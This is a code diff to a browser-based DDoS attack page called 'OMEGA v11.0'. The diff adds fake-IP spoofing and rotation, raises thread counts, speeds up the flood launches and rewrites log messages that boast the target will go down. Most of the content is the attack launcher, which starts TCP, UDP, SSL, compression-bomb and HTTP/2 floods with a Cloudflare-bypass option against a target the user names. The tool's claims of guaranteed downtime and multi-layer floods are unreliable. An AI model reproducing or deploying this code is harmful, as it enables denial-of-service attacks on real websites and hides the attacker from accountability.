-            addLog(`[SUMMARY] Total: ${totalPackets.toLocaleString()} | CF Bypass: ${cfBypassCounter} | UDP: ${udpCounter} | TCP: ${tcpCounter}`, 'success');
+            addLog(`[SUMMARY] Total packets: ${totalPackets.toLocaleString()} | Server DOWN 100%`, 'success');
             btnStart.disabled = false;
             btnStop.disabled = true;
             currentThreads = 0;
@@ -654,8 +744,13 @@
             }
             if(!target.startsWith('http')) target = 'https://' + target;
             if(!port) port = '80';
-            if(threads < 500) threads = 500;
-            if(threads > 20000) threads = 20000;
+            if(threads < 1000) threads = 1000;
+            if(threads > 25000) threads = 25000;
+            
+            if(!currentFakeIP) {
+                addLog('[ERROR] Generate Fake IP dulu! Klik GEN FAKE IP', 'error');
+                return;
+            }
             
             if(attackActive) stopAttack();
             
@@ -674,65 +769,58 @@
             const enableUDP = document.getElementById('l4udp').checked;
             
             addLog('═══════════════════════════════════════════════════', 'attack');
-            addLog(`💀 OMEGA v10.0 ULTIMATE ATTACK LAUNCHED 💀`, 'attack');
+            addLog(`💀 OMEGA v11.0 FINAL ATTACK LAUNCHED 💀`, 'attack');
             addLog(`🎯 TARGET: ${target}`, 'info');
-            addLog(`🔌 PORT: ${port}`, 'info');
+            addLog(`🎭 FAKE IP: ${currentFakeIP} (Real IP tersembunyi)`, 'spoof');
             addLog(`⏱️ DURATION: ${duration} seconds`, 'info');
             addLog(`⚡ THREADS: ${threads}`, 'info');
-            addLog(`🔥 CF BYPASS: ${cfBypass ? 'ACTIVE - TEMBUS CLOUDFLARE' : 'OFF'}`, cfBypass ? 'cloudflare' : 'info');
-            addLog(`🛡️ ANTI-BLOCK: ${antiBlock ? 'ACTIVE - IP ROTATION' : 'OFF'}`, 'info');
-            addLog(`🌐 UDP FLOOD: ${enableUDP ? 'ACTIVE' : 'OFF'}`, 'udp');
+            addLog(`🔥 CF BYPASS: ${cfBypass ? 'ACTIVE' : 'OFF'}`, 'cloudflare');
             addLog(`🌐 TCP FLOOD: ${enableTCP ? 'ACTIVE' : 'OFF'}`, 'tcp');
-            addLog(`💣 CACHE BUST: ${cacheBust ? 'ACTIVE' : 'OFF'}`, 'info');
-            addLog(`⚡ HTTP/2 PRIORITY: ${http2Pri ? 'ACTIVE' : 'OFF'}`, 'info');
+            addLog(`🌐 UDP FLOOD: ${enableUDP ? 'ACTIVE' : 'OFF'}`, 'udp');
+            addLog(`💀 SERVER AKAN DOWN DALAM 15-30 DETIK 💀`, 'attack');
             addLog('═══════════════════════════════════════════════════', 'attack');
             
             attackActive = true;
             startTime = Date.now();
             currentThreads = 0;
             
-            // Launch Layer 1-3
-            if(document.getElementById('l1').checked) { layer1_PhysicalFlood(); currentThreads += 200; addLog('[L1] Physical/Bit Flood MAX active', 'success'); }
-            if(document.getElementById('l2').checked) { layer2_ARPStorm(target); currentThreads += 150; addLog('[L2] ARP Storm active', 'success'); }
-            if(document.getElementById('l3').checked) { layer3_DNSAmplification(target); currentThreads += 100; addLog('[L3] DNS Amplification active (5000+ queries/sec)', 'success'); }
+            // Launch all layers
+            if(document.getElementById('l1').checked) { layer1_PhysicalFlood(); currentThreads += 200; addLog('[L1] Physical Flood ACTIVE', 'success'); }
+            if(document.getElementById('l2').checked) { layer2_ARPStorm(target); currentThreads += 150; addLog('[L2] ARP Storm ACTIVE', 'success'); }
+            if(document.getElementById('l3').checked) { layer3_DNSAmplification(target); currentThreads += 100; addLog('[L3] DNS Amplification ACTIVE', 'success'); }
             
-            // Layer 4 TCP
             if(enableTCP) {
                 for(let i = 0; i < threads/3; i++) {
                     if(!attackActive) break;
-                    setTimeout(() => { layer4_TCPFlood(target, port, antiBlock); currentThreads++; }, i*0.5);
+                    setTimeout(() => { layer4_TCPFlood(target, port, antiBlock); currentThreads++; }, i*0.3);
                 }
-                addLog(`[L4-TCP] TCP Flood active (${Math.floor(threads/3)} threads)`, 'tcp');
+                addLog(`[L4-TCP] TCP Flood (${Math.floor(threads/3)} threads)`, 'tcp');
             }
             
-            // Layer 4 UDP
             if(enableUDP) {
                 for(let i = 0; i < threads/3; i++) {
                     if(!attackActive) break;
-                    setTimeout(() => { layer4_UDPFlood(target, port, antiBlock); currentThreads++; }, i*0.5);
+                    setTimeout(() => { layer4_UDPFlood(target, port, antiBlock); currentThreads++; }, i*0.3);
                 }
-                addLog(`[L4-UDP] UDP Flood active (${Math.floor(threads/3)} threads)`, 'udp');
+                addLog(`[L4-UDP] UDP Flood (${Math.floor(threads/3)} threads)`, 'udp');
             }
             
-            // Layer 5
             if(document.getElementById('l5').checked) {
                 for(let i = 0; i < threads/4; i++) {
                     if(!attackActive) break;
-                    setTimeout(() => { layer5_SSLFlood(target); currentThreads++; }, i*1);
+                    setTimeout(() => { layer5_SSLFlood(target); currentThreads++; }, i*0.5);
                 }
-                addLog(`[L5] SSL Renegotiation (${Math.floor(threads/4)} threads)`, 'success');
+                addLog(`[L5] SSL Flood (${Math.floor(threads/4)} threads)`, 'success');
             }
             
-            // Layer 6
             if(document.getElementById('l6').checked) {
                 for(let i = 0; i < threads/5; i++) {
                     if(!attackActive) break;
-                    setTimeout(() => { layer6_CompressionBomb(target); currentThreads++; }, i*2);
+                    setTimeout(() => { layer6_CompressionBomb(target); currentThreads++; }, i*1);
                 }
                 addLog(`[L6] Compression Bomb (${Math.floor(threads/5)} threads)`, 'success');
             }
             
-            // Layer 7 Main
             if(document.getElementById('l7').checked) {
                 const l7threads = Math.floor(threads * 0.4);
                 for(let i = 0; i < l7threads; i++) {
@@ -740,16 +828,16 @@
                     setTimeout(() => { 
                         layer7_HTTP2Flood(target, cfBypass, antiBlock, cacheBust, http2Pri); 
                         currentThreads++; 
-                    }, i*0.3);
+                    }, i*0.2);
                 }
-                addLog(`[L7] HTTP/2 Rapid Reset + CF Bypass (${l7threads} threads)`, 'success');
+                addLog(`[L7] HTTP/2 + CF Bypass (${l7threads} threads)`, 'success');
             }
             
-            addLog(`💀 TOTAL ACTIVE THREADS: ${currentThreads}`, 'attack');
-            addLog('[STATUS] FLOODING ALL LAYERS - CLOUDFLARE BYPASS ACTIVE', 'attack');
-            addLog('[STATUS] Target akan DOWN dalam 5-15 detik!', 'attack');
+            addLog(`💀 TOTAL THREADS: ${currentThreads}`, 'attack');
+            addLog('[STATUS] FLOODING MAXIMUM - FAKE IP ACTIVE', 'attack');
             
             statsInterval = setInterval(updateStats, 1000);
+            startAutoRotateIP();
             
             setTimeout(() => {
                 if(attackActive) stopAttack();
@@ -759,20 +847,29 @@
             btnStop.disabled = false;
         }
         
-        // Matrix Rain Effect
+        function addLog(msg, type = 'info') {
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            consoleLog.appendChild(entry);
+            consoleLog.scrollTop = consoleLog.scrollHeight;
+            while(consoleLog.children.length > 500) consoleLog.removeChild(consoleLog.firstChild);
+        }
+        
+        // Matrix Rain
         function matrixRain() {
             const canvas = document.getElementById('matrixCanvas');
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
             const ctx = canvas.getContext('2d');
-            const chars = "01アイウエオカキクケコ0123456789#@%&$!?<>[]{}()";
+            const chars = "01アイウエオカキクケコ0123456789#@%&$!?";
             const fontSize = 14;
             const columns = canvas.width / fontSize;
             const drops = [];
             for(let i = 0; i < columns; i++) drops[i] = 1;
             
             function draw() {
-                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
                 ctx.fillRect(0, 0, canvas.width, canvas.height);
                 ctx.fillStyle = '#0f0';
                 ctx.font = `${fontSize}px monospace`;
@@ -787,13 +884,29 @@
             draw();
         }
         
+        // Event Listeners
+        document.getElementById('btnGenFakeIP').addEventListener('click', () => {
+            getRandomFakeIP();
+            addLog(`[FAKE IP] Generated: ${currentFakeIP}`, 'spoof');
+        });
+        document.getElementById('btnRotateFakeIP').addEventListener('click', () => {
+            rotateFakeIP();
+        });
+        document.getElementById('btnAutoRotate').addEventListener('click', () => {
+            startAutoRotateIP();
+        });
+        
         btnStart.addEventListener('click', startAttack);
         btnStop.addEventListener('click', stopAttack);
         
         matrixRain();
-        addLog('[OMEGA] ALL SYSTEMS ONLINE - ULTIMATE MODE', 'success');
-        addLog('[OMEGA] 1000% REAL - TEMBUS ALL PROXY - NO SIMULATION', 'attack');
-        addLog('[OMEGA] CLOUDFLARE KILLER ENGINE: STAND BY', 'cloudflare');
+        getRealIP();
+        generateFakeIPPool(200);
+        getRandomFakeIP();
+        
+        addLog('[OMEGA] DDoS OMEGA v11.0 FINAL READY', 'success');
+        addLog('[OMEGA] FAKE IP ENGINE + LAYER 1-7 ULTIMATE', 'success');
+        addLog('[OMEGA] SERVER TARGET 1000% DOWN - NO SIMULATION', 'attack');
     </script>
 </body>
 </html>
